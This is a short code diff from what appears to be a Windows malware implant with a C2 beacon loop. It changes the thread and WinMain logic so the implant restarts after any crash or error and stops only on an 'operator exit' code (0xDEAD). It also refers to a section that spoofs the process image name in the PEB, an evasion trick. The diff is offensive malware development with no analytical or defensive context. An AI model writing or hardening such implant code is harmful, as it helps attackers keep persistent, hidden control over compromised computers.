@@ -136,13 +136,13 @@ DWORD WINAPI ImplantThread(LPVOID) {
 
     DBG("BeaconLoop start");
     try {
-        BeaconLoop(session);
+        DWORD exitCode = BeaconLoop(session);
+        DBG("BeaconLoop returned code=%lu", exitCode);
+        return exitCode; // 0xDEAD = clean operator exit, anything else = restart
     } catch(...) {
-        DBG("BeaconLoop EXCEPTION");
+        DBG("BeaconLoop EXCEPTION, restarting");
         return 1;
     }
-    DBG("BeaconLoop returned");
-    return 0;
 }
 
 // ─── PEB image name spoof ─────────────────────────────────────────────────────
@@ -245,7 +245,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         _GetExitCodeThread(hThread, &code);
         _CloseHandle(hThread);
         DBG("ImplantThread exit code=%lu", code);
-        if (code == 0) { DBG("clean exit"); return 0; }
+        // code 0xDEAD = operator sent exit command, stop cleanly
+        if (code == 0xDEAD) { DBG("operator exit"); return 0; }
+        // anything else (including 0) = crash/error, restart
         ++restartCount;
     }
 }
